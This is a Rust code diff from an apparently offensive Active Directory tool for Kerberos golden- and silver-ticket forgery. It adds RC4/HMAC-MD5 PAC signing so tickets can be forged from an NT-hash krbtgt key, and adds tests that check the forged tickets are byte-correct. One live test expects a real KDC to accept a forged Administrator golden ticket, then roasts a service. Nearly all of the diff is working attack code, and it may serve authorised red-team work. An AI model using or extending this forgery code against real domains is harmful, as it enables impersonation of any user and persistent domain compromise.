@@ -247,12 +247,32 @@ fn aes256_checksum(key: &[u8], payload: &[u8]) -> Result<Vec<u8>> {
 
 /// Assemble a signed PACTYPE from the forged buffers. `server_key` signs the whole PAC
 /// (SERVER_CHECKSUM); `kdc_key` signs the server signature (KDC_CHECKSUM). For a golden TGT
-/// both are the krbtgt AES256 key; for a silver ticket the server key is the service account's.
-pub fn assemble_pac(id: &ForgeIdentity, server_key: &[u8], kdc_key: &[u8]) -> Result<Vec<u8>> {
-    // Signature buffers start zeroed: SignatureType(i32) + 12-byte HMAC placeholder.
+/// both are the krbtgt key; for a silver ticket the server key is the service account's. `rc4`
+/// selects the KERB_CHECKSUM_HMAC_MD5 (type -138) signatures for RC4 keys instead of the AES
+/// HMAC-SHA1-96 (type 16) ones.
+pub fn assemble_pac(
+    id: &ForgeIdentity,
+    server_key: &[u8],
+    kdc_key: &[u8],
+    rc4: bool,
+) -> Result<Vec<u8>> {
+    // Checksum + signature shape depends on the key type.
+    let sign = |key: &[u8], data: &[u8]| -> Result<Vec<u8>> {
+        if rc4 {
+            Ok(crate::rc4::hmac_md5_checksum(key, KERB_NON_KERB_CKSUM_SALT, data).to_vec())
+        } else {
+            aes256_checksum(key, data)
+        }
+    };
+    // Signature buffers start zeroed: SignatureType(i32) + HMAC placeholder (16 for MD5, 12 for AES).
     let mut sig_buf = Nd::default();
-    sig_buf.u32(SIG_HMAC_SHA1_96_AES256 as u32);
-    sig_buf.bytes(&[0u8; 12]);
+    if rc4 {
+        sig_buf.u32(crate::rc4::SIG_HMAC_MD5 as u32);
+        sig_buf.bytes(&[0u8; 16]);
+    } else {
+        sig_buf.u32(SIG_HMAC_SHA1_96_AES256 as u32);
+        sig_buf.bytes(&[0u8; 12]);
+    }
     let sig_template = sig_buf.b;
 
     // (ulType, data) in emission order.
@@ -288,12 +308,12 @@ pub fn assemble_pac(id: &ForgeIdentity, server_key: &[u8], kdc_key: &[u8]) -> Re
     pac.extend_from_slice(&data);
 
     // Server checksum over the whole PAC (both signatures still zeroed).
-    let server_sig = aes256_checksum(server_key, &pac)?;
+    let server_sig = sign(server_key, &pac)?;
     let (srv_off, _) = blocks[4];
     pac[srv_off + 4..srv_off + 4 + server_sig.len()].copy_from_slice(&server_sig);
 
     // KDC checksum over the server signature bytes only.
-    let kdc_sig = aes256_checksum(kdc_key, &server_sig)?;
+    let kdc_sig = sign(kdc_key, &server_sig)?;
     let (kdc_off, _) = blocks[5];
     pac[kdc_off + 4..kdc_off + 4 + kdc_sig.len()].copy_from_slice(&kdc_sig);
 
@@ -461,7 +481,7 @@ mod offline {
     #[test]
     fn pac_container_and_signatures() {
         let key = [0x42u8; 32];
-        let pac = assemble_pac(&sample(), &key, &key).unwrap();
+        let pac = assemble_pac(&sample(), &key, &key, false).unwrap();
         let parsed = parse_pac(&pac).unwrap();
         for t in [
             PAC_LOGON_INFO,
@@ -502,13 +522,56 @@ mod offline {
     fn silver_ticket_roundtrips() {
         let key = [0x37u8; 32];
         let tgt =
-            crate::forge_silver_tgt(&sample(), "CORP.LOCAL", &key, "cifs/dc01.corp.local").unwrap();
+            crate::forge_silver_tgt(&sample(), "CORP.LOCAL", &key, "cifs/dc01.corp.local", false)
+                .unwrap();
         let (_etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt silver");
         let parsed = parse_pac(&pac).unwrap();
         let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
         // UserId at fixed offset 120 in the LOGON_INFO buffer.
         assert_eq!(u32::from_le_bytes(li[120..124].try_into().unwrap()), 500);
         assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
+    }
+
+    /// RC4 golden ticket: forge under an NT-hash krbtgt key, then decrypt the EncTicketPart back
+    /// with RC4-HMAC (usage 2), recover the PAC, and confirm the SERVER_CHECKSUM is a valid
+    /// KERB_CHECKSUM_HMAC_MD5 (type -138) over the zeroed-signature PAC. Proves the RC4 forge +
+    /// HMAC-MD5 PAC signing are byte-correct, independent of any KDC etype policy.
+    #[test]
+    fn rc4_golden_roundtrips() {
+        let nt = crate::rc4::nt_hash("Krbtgt-NT-Hash!");
+        let tgt = crate::forge_golden_tgt(&sample(), "CORP.LOCAL", &nt, true).unwrap();
+        let plain = crate::rc4::decrypt(&nt, 2, tgt.ticket_cipher()).expect("rc4 decrypt ticket");
+        let etp: EncTicketPart = picky_asn1_der::from_bytes::<EncTicketPartApp>(&plain)
+            .expect("EncTicketPart decode")
+            .0;
+        let auth = etp.authorization_data.0.as_ref().expect("has auth-data");
+        let pac = extract_pac(auth).expect("extract PAC");
+        let parsed = parse_pac(&pac).unwrap();
+        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
+        // SignatureType must be -138 (HMAC-MD5), signature 16 bytes.
+        assert_eq!(
+            i32::from_le_bytes(srv.data[0..4].try_into().unwrap()),
+            crate::rc4::SIG_HMAC_MD5
+        );
+        assert_eq!(srv.data.len(), 4 + 16);
+        // Recompute the server checksum over the PAC with both signatures zeroed.
+        let stored = srv.data[4..20].to_vec();
+        let mut zeroed = pac.clone();
+        for i in 0..parsed.buffers.len() {
+            let base = 8 + i * 16;
+            let t = u32::from_le_bytes(zeroed[base..base + 4].try_into().unwrap());
+            let off = u64::from_le_bytes(zeroed[base + 8..base + 16].try_into().unwrap()) as usize;
+            if t == PAC_SERVER_CHECKSUM || t == PAC_KDC_CHECKSUM {
+                for b in zeroed[off + 4..off + 20].iter_mut() {
+                    *b = 0;
+                }
+            }
+        }
+        assert_eq!(
+            crate::rc4::hmac_md5_checksum(&nt, 17, &zeroed).to_vec(),
+            stored,
+            "RC4 golden SERVER_CHECKSUM (HMAC-MD5) mismatch"
+        );
     }
 
     #[test]
@@ -605,7 +668,7 @@ mod live {
             logon_server: "DC01".into(),
             logon_domain: realm.split('.').next().unwrap_or("CORP").to_uppercase(),
         };
-        let tgt = crate::forge_golden_tgt(&id, &realm, &key).expect("forge golden");
+        let tgt = crate::forge_golden_tgt(&id, &realm, &key, false).expect("forge golden");
         let hash = crate::roast_spn(&tgt, "Administrator", &spn, &kdc)
             .await
             .expect("KDC must accept the golden ticket (TGS-REP for the SPN)");
